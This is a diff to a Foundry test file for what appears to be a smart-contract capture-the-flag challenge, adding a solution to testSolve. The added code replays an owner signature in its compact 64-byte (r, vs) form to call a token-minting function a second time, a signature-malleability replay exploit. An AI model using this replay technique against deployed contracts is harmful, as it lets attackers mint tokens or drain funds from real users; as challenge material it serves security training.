@@ -109,6 +109,24 @@ contract TestForger is Test, Utils {
 
     /// @notice Intentionally left without exploit logic.
     function testSolve() public checkSolvedByPlayer {
+        instance.createNewTokensFromOwnerSignature(SIGNATURE, RECEIVER, 100 ether, SALT, DEADLINE);
+
+        bytes memory signature = SIGNATURE;
+        bytes32 r;
+        bytes32 s;
+        uint8 v;
+        assembly {
+            r := mload(add(signature, 0x20))
+            s := mload(add(signature, 0x40))
+            v := byte(0, mload(add(signature, 0x60)))
+        }
+        bytes32 vs = v == 28 ? bytes32(uint256(s) | (1 << 255)) : s;
+        bytes memory sig64 = abi.encodePacked(r, vs);
+
+        console.logBytes(signature);
+        console.logBytes(sig64);
+
+        instance.createNewTokensFromOwnerSignature(sig64, RECEIVER, 100 ether, SALT, DEADLINE);
 
     }
 }
